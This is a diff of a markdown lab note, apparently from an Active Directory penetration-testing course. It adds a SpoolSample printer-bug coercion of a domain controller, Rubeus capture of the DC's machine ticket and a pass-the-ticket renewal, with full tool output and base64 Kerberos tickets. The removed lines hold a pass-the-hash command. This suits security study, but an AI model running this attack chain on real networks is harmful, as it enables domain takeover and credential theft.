@@ -13,42 +13,20 @@ context
 
 ### Vector Attack
 
-```bat
-.\Rubeus.exe monitor /interval:5 /nowrap
 
-# Group enumeration
-
-Import-Module .\PowerView.ps1
-
-Get-DomainGroup -MemberIdentity <user name>
 ```
-
-
-to see the available shares I can use this:
-
-```bat
-net view \\COPUTERNAME
-```
-
-```bat
-.\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
-uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
-9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt
-```
-
-
-```bat
-.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
-```
-
-
-
 C:\Windows\system32>cd c:\Tools
 
 c:\Tools>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
+PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local
+Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
 PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
 
    ______        _
@@ -64,56 +42,219 @@ PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
 [*] Monitoring every 5 seconds for new TGTs
 
 
-[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:
+<snip code>
 
-  User                  :  derek.walker@INLANEFREIGHT.LOCAL
-  StartTime             :  9/2/2024 1:37:30 AM
-  EndTime               :  9/2/2024 11:37:30 AM
-  RenewTill             :  9/9/2024 1:37:30 AM
-  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
-  Base64EncodedTicket   :
+[*] 9/4/2024 2:16:22 PM UTC - Found new TGT:
 
-    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
-
-
-[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:
-
-  User                  :  SQL01$@INLANEFREIGHT.LOCAL
-  StartTime             :  9/2/2024 1:37:31 AM
-  EndTime               :  9/2/2024 11:37:31 AM
-  RenewTill             :  9/9/2024 1:37:31 AM
-  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
-  Base64EncodedTicket   :
-
-    doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIETj6VqVjIKmf5A7miWpNrk3qEi2b9erucZwyu4NSIPCB/1+2vX7Jnc5cI5mHto7Jc1fxUmnI21NVE85JNQS4J2x1ffOwY4hc8EP9HWxakK4ifOfr1j1KOmCPoNPOHsicCpRQ3fnVB7OKVjEyNBRTpwpr0rdo+7RLx6psnvw/8x550QK1xOxkRA05hoYqrQ5jksJNrd3F9PdleV9SJU4J3B7EeWPobweVa07iHSTLXllciJbpf4lgHR/6AZLW9w8vDfRkHsNvh3o+VE8Weg+8eFwocYWgbU7WarGxvIS1SVtSYSVhpK+BAmh37QLOg1GtLJv3HAVbmZjZIFkm9J3nozJs4SB5vzqn2g87ssZLQFC7jsO62sfYmxaf/PoCNbLEYiJHPRhk4y6I//xihoO0beQtSemNGYPbP2LJnSTlPr5upPKCCU7ORMOOSoMGBLH7b2n5irfX/NdyoQBCgYhEW6jUPVAa5hkyOdTPItq8h3X7OrT+9mKJhVIFtI9OCWegS3tWHOMI8O305VQjwQnQFG1b6VB8xYJSkD3UWj2umyNT6L7Ijqx5lYezAKhSu3QYjMEudVax3me1UlHYgCPjLwvbUAPIOhDVCYERAzSd8QM1XKmi+37IiYVM59NRl6j//PRL3x27prgOVEKuke1ozPYYrnCDaYN/MOBzF8V+sGE7bfLZ5PVBqjujqXLLJo2oCLvsLluoer79z2BpoXtJg2ln9QqYsDVmU+7zjw6Z5ikx4jf3PaEe72ZLRSAWn3JIVmJ0EKmNhJvpV8ddAQ386dytLgSrr9jL0JDNeXl2EBdB8efYTAYapxuxQlAE4ATYdT1Y8TsTsRwbj1+LwrAVMbUt2Ell+zWOvkN77se0e9s5Yvu+bKNud+XUikAMzTb/myb9vOoIKSBnAQ9EqXLEen4KMAMiRZKqQ9ySCZv8iwiOwnuUQCQAz8FJHZGIMOhKmGbI3lUpF9/i/XjPZLFEYs46EYdFYfnf7sDbJcnsQ7JIh1Xb5KHUWPnfXfeHY8xN4sw7KSGtTowWYvZs2AKbPTQPQ/s80qASSGl5nQRzW2HWjzfscPI17F9OmZkfUNxF8+L+RmU2y1ft2vCZ8VMSrEmCn2QSDrjFXpH2FdN5ZjzXmP7kxKVlsdBsgs1rB5MIA+Wi0dHX6acS0ad4chfclWhLmqJTd4aLCn/xBmbVOdfYQIE9VukeYM7HkY2uc9Iw0aFO7pBsTr1xpO06VfxY+z1lcdYS6vhPYmBUi7PxT6ncljwAQX7JVnAoGLZGqsseL0GFNmi3ryn2BngqdM65EXAO/OkN9JIgKlQCX0LKJTvXVjfdwSCLsnqtiDV4eyDXR/amWK8sxrzoaQJjs+VcdYV1MgPWXWW3Ij7GzEOWCW5p5A4H2dEJFfwwEEJA/y4QeMyoA6r4r+rspiJwzcNegI53M0DtdYwOw8goRDoiLGgxc51ia2ndyGV1XTHjMxp+jgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCCKHMABTodvI9nCoN0V6MaBR/eAJAlfuKlRtbkJj2jOaqEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjQwOTAyMDYzNzMxWqYRGA8yMDI0MDkwMjE2MzczMVqnERgPMjAyNDA5MDkwNjM3MzFaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=
-
-
-[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:
-
-  User                  :  SQL01$@INLANEFREIGHT.LOCAL
-  StartTime             :  9/2/2024 1:38:03 AM
-  EndTime               :  9/2/2024 11:38:03 AM
-  RenewTill             :  9/9/2024 1:38:03 AM
-  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
-  Base64EncodedTicket   :
-
-    doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIEThPuH1UujCQM4c5Wj05YnkrUZwMMMZSM4xqJHIOb633jO1Qp6SFbxE7U0w9pCCCX+d5Og19j63J8se76jk1PQX6bVz5N0vgaOc5qR6AJQY1PjDSCmN69kwJUs8/rraY1AoO8+6cqjmdbPo3LRFB2JRpRLHE+9sLEkZSHm/Vil1CX5sgkUjMPrenugOLdHhpejwFetd528ERVP3PYXP2r9dl68ly9MYkWLcJIyZtjJfiEzLqeE1Rxo7Mau+C5e2GiOtA5pYHWRIHcVwBLCDD3BakCqFWsxRyMSRi/ZVNQqolfdMqUrpq7GT+mryhEkoLe0Hd4ukZc1VFpfo9dq99HIQOsvI/tugQ3Gm/UvLmeEsPAwIHx8gtp0KgS40/Y+HuToVu3cCgNPmMBGtSDzC58JFiP2ToSOJJpbJ09WPFd/XtzmV9mFHHIXd1WMFKyKqdO4Ux7jmlGqYhJFa82rVPE0qDgPIBiTgXE4YkRBxknJTWXRd9bJ1B1aY57CGL/vJvNB1/xPoSCLXPaJ2jEh0/reTb0vvmbb7cZlVpJoQekhHI5E7euFk2iBvnHd1z1mRz1AQo82UuS59P6lXv8/mcbqT8h2N6d8xfoyq89JxJ6YmpJZz7si3U44bmu/U1fjgycR8q2i4ek1BkzCV13S0MlzZ54ekDYwRB6GjmXc0mxW5sa9ufWebRdQ+ChrdUHFSIpl0Tqe9ePCoJ2ttjezjYVdekQPI9JaAHWhcaZNIxeTp+5POcLkmregZmxPJ7SHkJZC9wrgyRKep33KNJrAjfsKUttY/PFXZ3nMhQn6h+ICHYbTl9fq3tImZ3wz9OspFPQLUR3o2q7iab9V8IuVQYZF/gaJFIU8/IjEmIEwd7IAbYyEUciQZB2t1ty0rpAda6CUBm0Pysvc3JXrbGw6XVf4e0BjMIjaHDGLYkqI2/S+vl5qw4PuJPVOTlj7S+3vpKytvGDjPVQTfO2PUSCafwGr2KCe+Mprv/nSV1RtqtfY9YNM4txbpW78S+nWTcHaPCwHp4moMSwwuUIXIKgY5ugeWef6Tv2BFCCUG8Eqcs6+6tIw7iuNUBFLlyFfBRHC9TJDpFu1R0kOosusiqWR3dNl3KfVrc+oOcPE2AZfMc6UNfR76uTA8cdnbMgDLmM3YsSZbhlkFdrZQb3H1KJ4gN0ed89miUcm/9VVn3/qO9UFSeKqzpgKPLShq49QrllwSgJOvn0Z27d2CeOnECn+TwpYfbfEpP7EkOdzLHkXvjwWc7yqrUDh1WgdQH4LvWc5kIpRQqbOoqbgyRrEADBd4+vH3qmB6v7tkOHGhe0/SVba0wH8GsCEIeWzCjxBTbQPuApK32vpA7SZ6CxFSgW+efNF2jRIt4Ggq8t7XM9L3a4pzwU5c2Cvuk/X0UesgILKwmrpPhGHS/Bh80XNhWVsSru3bFc8Ma6BwLwPlx+JtMZZgfeDll/NK6WhE+bm8plYJWjgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCDhydEJQdilA1X0dQhBT6Al+z7XkXSM5R/I1wDIjqvJW6EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjQwOTAyMDYzODAzWqYRGA8yMDI0MDkwMjE2MzgwM1qnERgPMjAyNDA5MDkwNjM4MDNaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=
-
-[*] Ticket cache size: 3
-
-
-[*] 9/2/2024 6:44:53 AM UTC - Found new TGT:
-
-  User                  :  brian.willis@INLANEFREIGHT.LOCAL
-  StartTime             :  9/2/2024 1:44:36 AM
-  EndTime               :  9/2/2024 11:44:36 AM
-  RenewTill             :  9/9/2024 1:44:36 AM
+  User                  :  DC01$@INLANEFREIGHT.LOCAL
+  StartTime             :  9/4/2024 9:08:10 AM
+  EndTime               :  9/4/2024 7:08:10 PM
+  RenewTill             :  9/11/2024 9:08:10 AM
   Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
   Base64EncodedTicket   :
 
-    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
+    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
 
-[*] Ticket cache size: 4
+PS C:\Tools> .\Rubeus.exe renew /ticket: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 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggR7MIIEd6ADAgESoQMC
+      AQKiggRpBIIEZVtu22Jo3JPSh1QmhGENk3qC3QlCmYPuNrfKmUMhrqfnSaFT7d7/JEJWI9m+IQ7NcnFM
+      +dOpVFntEKfSY6urQwn5f2c0VCAWY9CUng67OEQRlcw8oUMhwC7dOHSDfcrm8Bps8ZwIU1Za3z/PZ1U0
+      5AdPwshAO1mzJp7hy5ZhV667P8g2cCU4RQ7GEQa9s8Th45U/6SwZcwgDh74oQ8EeqdmTBvJH8vWtp0Ds
+      joiK5pq7b7dEExDY73qimoOTqa94y7oGattgHpIO2atDqYVx3AHn+rxlCqBsqsFR7nUq8ZyzR/IVyK0M
+      andn3V8THodJUfyWJKiCTENQduNsy96hzsXhSNJsSLE/QcJaJqi3P6SDhIJfN+E4V6ghber6cC3XbYYx
+      SZQcUWpml1x4P4XWIGkRNdziQMVyEau8lknB4zAzNkDL7SDDCCOsNNf/C+dfnTcOh8CJBsXxqh1okQmu
+      mNDq1iU08bxe18ISqwGCRGzR0MeM1LMrxOlRCx+cdq7m+mYMF6O+bE31hNzqF9KpD86DH8Y85s2M6HKs
+      DoBLBIXbD/Mqvwyfqa/4BaeZYvN8BkCZ+GS8xZ0odUqfKAZ40lHIlVMTZTfmqzscvWww4CvwMxmIsh5H
+      0A6SQQzqpATPKFgVHvWIqyq2b+7VPuUdjoYmGNC2GhNanyk/YlmKaffmuJJKjd6l2Tb3e0kkhcK3YXZC
+      wGL/knTveZYHT8uzW2fZMWdVGn4DwkGaokEysO7zyFIT0vqj2RBh3dLuxf/3h9s+rYh4wCd+yKB2rXuY
+      6z1TjiNFUlTkP+RPQfRtvIOYysRG7ZaP+ex+1hXbxWoUFjoDZVBxGBebDDLx3BSShBOwUr+bKHau4pM0
+      xP8PsEulUVMcMVwlCy0HgA/eteOdAvaRaQorLn5CG/SIvJXRcvjUj3Arvan8yU8P1LQ1AaWyZI9Uuj+s
+      I8UwFT8wpoVCNSnAl2a5TVigWQDZdR8px9afhhV/JTgrfGKZ7Nw7PBw/IX68PqDnv4cenIlaYZ5W+5MQ
+      Gaps1g6i9s/3y2E4Ih0QoLbK5Xga0HCbP7pNiTFlxFj96293iuSfo7Ru58b6Ageggv6f+q4K1vMgXwI1
